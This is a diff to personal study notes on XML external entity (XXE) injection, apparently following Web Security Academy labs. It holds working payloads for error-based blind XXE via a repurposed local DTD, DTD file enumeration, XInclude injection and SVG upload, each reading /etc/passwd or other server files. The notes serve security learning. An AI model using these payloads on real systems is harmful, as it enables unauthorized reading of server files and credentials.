@@ -164,7 +164,7 @@ Change to:
  <storeId>1</storeId>
 </stockCheck>
 ```
-And in burp collab we see a log a an http req.
+And in burp collab we see a log of an http req.
 It's interesting that after the modification we got the following response from the server:
 ```bash
 HTTP/2 400 Bad Request
@@ -305,10 +305,114 @@ And change the request body:
 And we see an error that contains contents of /etc/passwd
 
 ### Exploiting blind XXE by repurposing a local DTD
-The preceding technique works fine with an external DTD, but it won't normally work with an internal DTD that is fully specified within the DOCTYPE element. This is because the technique involves using an XML parameter entity within the definition of another parameter entity. Per the XML specification, this is permitted in external DTDs but not in internal DTDs. (Some parsers might tolerate it, but many do not.) 
+The preceding technique works fine with an external DTD, but it won't normally work with an internal DTD that is fully specified within the DOCTYPE element. This is because the technique involves using an XML parameter entity within the definition of another parameter entity. Per the XML specification, this is permitted in external DTDs but not in internal DTDs. (Some parsers might tolerate it, but many do not.)
+
+So what about blind XXE vulnerabilities when out-of-band interactions are blocked? You can't exfiltrate data via an out-of-band connection, and you can't load an external DTD from a remote server.
+
+In this situation, it might still be possible to trigger error messages containing sensitive data, due to a loophole in the XML language specification. If a document's DTD uses a hybrid of internal and external DTD declarations, then the internal DTD can redefine entities that are declared in the external DTD. When this happens, the restriction on using an XML parameter entity within the definition of another parameter entity is relaxed.
+
+This means that an attacker can employ the error-based XXE technique from within an internal DTD, provided the XML parameter entity that they use is redefining an entity that is declared within an external DTD. Of course, if out-of-band connections are blocked, then the external DTD cannot be loaded from a remote location. Instead, it needs to be an external DTD file that is local to the application server. Essentially, the attack involves invoking a DTD file that happens to exist on the local filesystem and repurposing it to redefine an existing entity in a way that triggers a parsing error containing sensitive data. This technique was pioneered by Arseniy Sharoglazov, and ranked #7 in our top 10 web hacking techniques of 2018.
+
+For example, suppose there is a DTD file on the server filesystem at the location /usr/local/app/schema.dtd, and this DTD file defines an entity called custom_entity. An attacker can trigger an XML parsing error message containing the contents of the /etc/passwd file by submitting a hybrid DTD like the following: 
+```bash
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
+<!ENTITY % custom_entity '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+```
+This DTD carries out the following steps:
+- Defines an XML parameter entity called local_dtd, containing the contents of the external DTD file that exists on the server filesystem.
+- Redefines the XML parameter entity called custom_entity, which is already defined in the external DTD file. The entity is redefined as containing the error-based XXE exploit that was already described, for triggering an error message containing the contents of the /etc/passwd file.
+- Uses the local_dtd entity, so that the external DTD is interpreted, including the redefined value of the custom_entity entity. This results in the desired error message.
+
+### Locating an existing DTD file to repurpose
+Since this XXE attack involves repurposing an existing DTD on the server filesystem, a key requirement is to locate a suitable file. This is actually quite straightforward. Because the application returns any error messages thrown by the XML parser, you can easily enumerate local DTD files just by attempting to load them from within the internal DTD.
+
+For example, Linux systems using the GNOME desktop environment often have a DTD file at /usr/share/yelp/dtd/docbookx.dtd. You can test whether this file is present by submitting the following XXE payload, which will cause an error if the file is missing: 
+
+```bash
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+%local_dtd;
+]>
+```
+After you have tested a list of common DTD files to locate a file that is present, you then need to obtain a copy of the file and review it to find an entity that you can redefine. Since many common systems that include DTD files are open source, you can normally quickly obtain a copy of files through internet search. 
 
 ### Lab: Exploiting XXE to retrieve data by repurposing a local DTD
-https://www.youtube.com/watch?v=rPECmhLw_00
+This may come in handy:
+https://www.youtube.com/watch?v=mAqY3OsVuE8
+
+There's an endpoint:
+```bash
+POST /product/stock HTTP/2
+
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck>
+ <productId>1</productId>
+ <storeId>1</storeId>
+</stockCheck>
+```
+Since we want to redefine entities in one of the existing on the server files - we therefore need to find out which files exist on the server. For that purpose we modify the req.body:
+```bash
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/random.dtd">
+%local_dtd;
+]>
+<stockCheck>
+ <productId>1</productId>
+ <storeId>1</storeId>
+</stockCheck>
+```
+And we get back the err:
+```bash
+HTTP/2 400 Bad Request
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 112
+
+"XML parser exited with error: java.io.FileNotFoundException: /usr/share/random.dtd (No such file or directory)"
+```
+But if we try the following:
+```bash
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+%local_dtd;
+]>
+<stockCheck>
+ <productId>1</productId>
+ <storeId>1</storeId>
+</stockCheck>
+```
+We get back 200 OK response, which means that file exists on the server.
+
+Therefore let's try to redefine existing entities:
+```bash
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE message [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+<stockCheck>
+ <productId>1</productId>
+ <storeId>1</storeId>
+</stockCheck>
+```
+And we see the contents of /etc/passwd in the response
+
 
 ## Finding hidden attack surface for XXE injection
 Attack surface for XXE injection vulnerabilities is obvious in many cases, because the application's normal HTTP traffic includes requests that contain data in XML format. In other cases, the attack surface is less visible. However, if you look in the right places, you will find XXE attack surface in requests that do not contain any XML. 
@@ -324,4 +428,81 @@ To perform an XInclude attack, you need to reference the XInclude namespace and 
 <xi:include parse="text" href="file:///etc/passwd"/></foo>
 ```
 
+### Lab: Exploiting XInclude to retrieve files
+This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.
+
+Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.
+
+To solve the lab, inject an XInclude statement to retrieve the contents of the /etc/passwd file. 
+
+Hint:
+By default, XInclude will try to parse the included document as XML. Since /etc/passwd isn't valid XML, you will need to add an extra attribute to the XInclude directive to change this behavior. 
+
+#### Exploiting:
+we have a req:
+```bash
+POST /product/stock HTTP/2
+
+productId=1&storeId=1
+```
+The server embeds the user input inside a server-side XML document that is subsequently parsed
+
+Therefore change the req.body:
+```bash
+productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
+```
+And the lab is solved : )) We get back the contents of /etc/passwd
+
+BTW:
+If we see some req.body and we want to test for xxe, we can try to write xml entities, e.g.:
+```bash
+POST /product/stock HTTP/2
+
+productId=%26entity;&storeId=1
+```
+(%26 is url encoded & sign)
+
+After we send the req above, we get the response:
+```bash
+HTTP/2 400 Bad Request
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 47
+
+"Entities are not allowed for security reasons"
+```
+This is a clear indication that the value is later embedded into xml document
+
+### XXE attacks via file upload
+Some applications allow users to upload files which are then processed server-side. Some common file formats use XML or contain XML subcomponents. Examples of XML-based formats are office document formats like DOCX and image formats like SVG.
+
+For example, an application might allow users to upload images, and process or validate these on the server after they are uploaded. Even if the application expects to receive a format like PNG or JPEG, the image processing library that is being used might support SVG images. Since the SVG format uses XML, an attacker can submit a malicious SVG image and so reach hidden attack surface for XXE vulnerabilities. 
+
+### Lab: Exploiting XXE via image file upload
+There's a submit feedback form. It allows us to upload an avatar. For image processing it uses Apache Batik library. Therefore as an img we can upload a malicious svg file (svg is basically xml)
+
+Modify the path of the file that you want to extract values from in `./avatar.svg`. If left umnodified it'll get values from `file:///etc/hostname`
+
+Upload to the server and view the newly created comment. In the place of image you'll find contents of `file:///etc/hostname` (or whatever file you specified)
+
+## XXE attacks via modified content type
+Most POST requests use a default content type that is generated by HTML forms, such as application/x-www-form-urlencoded. Some web sites expect to receive requests in this format but will tolerate other content types, including XML.
+
+For example, if a normal request contains the following: 
+```
+POST /action HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+
+foo=bar
+```
+Then you might be able submit the following request, with the same result: 
+```
+POST /action HTTP/1.0
+Content-Type: text/xml
+Content-Length: 52
+
+<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
+```
+If the application tolerates requests containing XML in the message body, and parses the body content as XML, then you can reach the hidden XXE attack surface simply by reformatting requests to use the XML format. 
 
